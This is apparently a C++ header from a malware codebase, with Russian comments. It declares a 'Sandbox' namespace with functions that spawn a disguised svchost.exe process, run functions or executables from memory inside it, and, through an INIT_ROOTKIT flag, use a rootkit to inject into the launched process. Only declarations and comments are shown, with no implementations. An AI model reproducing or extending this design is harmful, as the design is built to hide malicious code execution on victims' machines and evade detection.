#pragma once

#include "core\core.h"
#include "core\pipe.h"

//песочница для выполнения команд в отдельных процессах

namespace Sandbox
{

//перед запуском процесса в песочнице инициализировать rootkit, 
//чтобы через него внедрится в запускаемый процесс
const uint INIT_ROOTKIT = 0x0000001;

//запускает отдельный процесс svchost.exe, стартует там func и передает данные data
//описание nameUser смотри в функции Process::Exec()
//если exe = true, то в data находится exe файл для запуска в памяти
bool Run( typeFuncThread func, const char* nameUser, const void* data, int c_data, bool exe );
//должна вызываться в самом начале функции песочницы (самая 1-я функция в func из Run()),
//возвращает указатель на переданные параметры, в последствии память нужно будет освободить
//также функция инициализирует ядро. Если указать size, то туда будет помещен размер принятых данных
void* Init( int* size = 0 );

//стартует указанный процес через песочницу
bool Exec( StringBuilder& cmd, uint flags = 0, const char* nameUser = 0 );
bool Exec( const char* cmd, uint flags = 0, const char* nameUser = 0 );

//запускает файл в памяти
bool RunMem( const void* data, int size, const char* nameUser = 0 );
inline bool RunMem( const Mem::Data& data, const char* nameUser = 0 )
{
	return RunMem( data.Ptr(), data.Len(), nameUser );
}

}
